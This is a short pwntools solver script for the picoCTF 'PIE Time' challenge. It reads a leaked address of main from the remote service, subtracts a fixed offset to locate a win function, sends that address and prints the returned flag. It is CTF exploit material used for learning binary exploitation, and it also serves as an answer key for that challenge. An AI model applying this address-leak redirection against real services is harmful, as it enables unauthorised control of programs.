#!/usr/bin/python3
from pwn import *
import warnings
import os

#run python -m venv my-venv
#cd my-venv
#source my-venv/bin/activate

warnings.filterwarnings('ignore')
context.log_level = 'critical'

fname = '/home/ubuntu/Downloads/PIE Time/vuln' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
  
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else 'rescued-float.picoctf.net'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 59038
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP}:{PORT}\n')

r.recvuntil("main: ")
addressOfMain = r.recvuntil("\n")
addressOfMainInt = int(addressOfMain.rstrip().decode(),16)
addressOfWinInt = addressOfMainInt - 150
addressOfWinHex = hex(addressOfWinInt)

r.recvuntil("0x12345: ",drop=True)

r.sendline(str(addressOfWinHex))

print(r.recvuntil("won!\n"))
picoCTFFlag = r.recv()
print(picoCTFFlag)